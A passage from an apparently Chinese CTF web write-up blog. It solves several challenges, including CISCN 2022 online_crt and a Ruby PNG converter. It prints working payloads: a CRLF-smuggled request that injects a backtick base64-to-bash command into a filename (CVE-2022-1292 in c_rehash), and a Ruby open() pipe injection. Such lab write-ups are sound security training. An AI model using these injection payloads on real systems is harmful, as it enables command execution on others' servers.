class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">  这里我们稍微解释一下第一个GET和第二个GET的作用分别是什么</span><br><span class="line">        第一个GET后的/phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php)</span><br><span class="line">PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件</span><br><span class="line">        而第二个GET后的/请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png" alt="image-20241225155117505"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png" alt="image-20241225155204995"></p><p>直接拿下了。</p><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>给了我们源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要看一个python文件和一个go文件，先分析一下功能点</p><p>先看python文件，&#x2F;getcrt路由是生成一个crt证书并return给我们，&#x2F;createlink是一种命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c_rehash static/crt/ &amp;&amp; ls static/crt/</span><br></pre></td></tr></table></figure><p>利用了c_rehash进行执行。这里c_rehash其实存在CVE-2022-1292。</p><p>c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接，是当用户可控文件名时的命令注入</p><p>他会执行文件名的内容，当文件名存在反引号时！</p><p>cve分析：</p><p><a href="https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox">https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox</a></p><p>然后看&#x2F;proxy，与自身的8887端口建立连接，8887端口对应go服务，将两种语言联系在了一起。这里的uri是可控的，我们可以通过CRLF构造任意数据包。我们也必须要CRLF来构造，因为存在c.Request.URL.RawPath !&#x3D; “” &amp;&amp; c.Request.Host &#x3D;&#x3D; “admin”</p><p><strong>go的RawPath特性：</strong></p><p>通过阅读go net库的源码<br>我发现在go中会对原始url进行反转义操作(URL解码)<br>如果反转义后再次转义的url与原始url不同 那么RawPath会被设置为原始url 反之置为空</p><p>因此我们只要随便对一个斜杠进行url编码即可。</p><p>然后就可以构造恶意数据包了。然后通过表单传入uri即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">uri=<span class="string">&#x27;&#x27;&#x27;/admin%2frename?oldname=b58a6a37-6cc5-46bf-a98f-d589a9957a1f.crt&amp;newname=`echo%20bHMgLw==|base64%20-d|bash&gt;flag`.crt HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">gopher = uri.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload=urllib.parse.quote(gopher)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>此处的作用是ls &#x2F;</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png" alt="image-20241227153626689" style="zoom: 67%;" /><p>成功后&#x2F;createlink一下让他执行命令。</p><p>然后去&#x2F;static&#x2F;crt&#x2F;访问即可</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png" alt="image-20241227153710490" style="zoom:80%;" /><p>同理可读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;ee493ebd-0ef5-4594-baa9-ec7ad1a5f601&#125;</span><br></pre></td></tr></table></figure><h2 id="第五空间-2021-PNG图片转换器"><a href="#第五空间-2021-PNG图片转换器" class="headerlink" title="[第五空间 2021]PNG图片转换器"></a>[第五空间 2021]PNG图片转换器</h2><p>给了源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>上传后的文件也只能是png后缀的，文件上传漏洞是不太可能存在的。</p><p>这里考察的是ruby的file open漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open()函数可以进行命令执行</span><br></pre></td></tr></table></figure><p>将文件名构造成恶意payload即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=|`echo+ZW52|base64+-d`;cat+1.png</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png" alt="image-20241230171141882"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png" alt="image-20241230171148314" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d95c546d-fb51-4696-b923-66d3758d20c6&#125;</span><br></pre></td></tr></table></figure><h2 id="GHCTF-2024-新生赛-ezzz-unserialize"><a href="#GHCTF-2024-新生赛-ezzz-unserialize" class="headerlink" title="[GHCTF 2024 新生赛]ezzz_unserialize"></a>[GHCTF 2024 新生赛]ezzz_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hey</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@message</span>: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="comment"> * Have fun and Good luck!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span 